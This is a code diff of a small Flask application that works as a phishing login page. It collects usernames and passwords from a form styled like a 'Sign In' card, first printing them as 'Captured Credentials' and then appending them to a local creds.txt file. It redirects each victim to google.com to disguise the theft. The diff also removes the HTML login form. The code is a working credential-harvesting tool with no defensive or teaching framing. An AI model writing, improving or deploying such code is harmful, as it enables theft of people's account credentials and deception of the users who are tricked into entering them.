@@ -62,12 +62,12 @@ if __name__ == '__main__':
     app.run()
 
 
-
-from flask import Flask, render_template, request, redirect, url_for
+from flask import Flask, render_template, request, redirect
 import json
+import os
 
 app = Flask(__name__)
-credentials = []  # In-memory store (for demo only)
+CRED_FILE = 'creds.txt'
 
 @app.route('/')
 def login_page():
@@ -77,23 +77,14 @@ def login_page():
 def login():
     username = request.form.get('username')
     password = request.form.get('password')
-
-    credentials.append({'username': username, 'password': password})
-    print("Captured Credentials:", json.dumps(credentials, indent=2))
-
-    return redirect('https://www.google.com')  # Redirect after "error"
+    credentials = {
+        'username': username,
+        'password': password
+    }
+    # Append credentials to a file
+    with open(CRED_FILE, 'a') as f:
+        f.write(json.dumps(credentials) + '\n')
+    return redirect('https://www.google.com') 
 
 if __name__ == '__main__':
     app.run(debug=True)
-
-
-<body>
-  <div class="login-card">
-    <h2>Sign In</h2>
-    <form method="POST" action="/login">
-      <input type="text" name="username" placeholder="Email or phone" required />
-      <input type="password" name="password" placeholder="Enter your password" required />
-      <button type="submit">Next</button>
-    </form>
-  </div>
-</body>
